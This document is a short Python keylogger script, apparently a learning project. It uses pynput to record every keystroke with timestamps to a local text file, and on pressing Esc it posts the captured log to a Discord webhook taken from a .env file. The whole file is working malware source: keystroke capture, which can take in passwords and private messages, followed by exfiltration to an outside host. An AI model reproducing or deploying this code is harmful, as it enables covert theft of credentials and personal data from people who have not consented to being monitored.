import datetime
import os
import requests
from pynput import keyboard
from dotenv import load_dotenv

# key logging variables including file path to log file
log_file = "./key_presses.txt"
keys_pressed = "" 

# this loads and sends the logs to discord
def send_log_to_discord():
    # Loads the .env file from the repository
    load_dotenv()
    # Loads the webhook from the .env file
    webhook = os.getenv("WEBHOOK_URL")

    # opens the log and reads the content
    with open(log_file, "r") as f:
        # stores the content in the content variable
        content = f.read()

    # Check to ensure the content doesnt go over discords boundarys
    if len(content) > 1900:
        # gets the last amount of characters that discord can handle
        content = content[-1900:]

    # Stotes the content in a dictionary to be turned into json
    data = {"content": f"Log update:\n{content}"}
    # Sends the data via a http post to the webhook
    response = requests.post(webhook, json=data)
    
    # Checks if the status code is successfully
    if response.status_code == 204:
        # Outputs success message
        print("Log sent to Discord successfully!")
    else:
        # outputs error message and status code
        print(f"Failed to send log. Status code: {response.status_code}")

# Records key presses
def on_press(key):
    # Turns keys pressed into a global variable
    global keys_pressed
    # Trys to add keys pressed to keys char
    try:
        # adds key to keys pressed
        keys_pressed += key.char  # regular key
        # Prints the key pressed
        print(f"Key {key.char} pressed")
    except AttributeError:
        # adds key to keys pressed
        keys_pressed += f"[{key}]"  # special key
        # Prints the key pressed
        print(f"Special key {key} pressed")

# Records released keys
def on_release(key):
    # Turns keys pressed into a global variable
    global keys_pressed
    
    # Only write if something was typed
    if keys_pressed:
        # Opens the log file with append permissions
        with open(log_file, "a") as f:
            # Writes the key pressed to the log
            f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
        keys_pressed = ""  # reset after writing
    # Checks if the key is esc
    if key == keyboard.Key.esc:
        # Outputs exiting keylogger
        print("Exiting keylogger...")
        # sends the log to discord
        send_log_to_discord()
        # retuns false 
        return False

# Keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()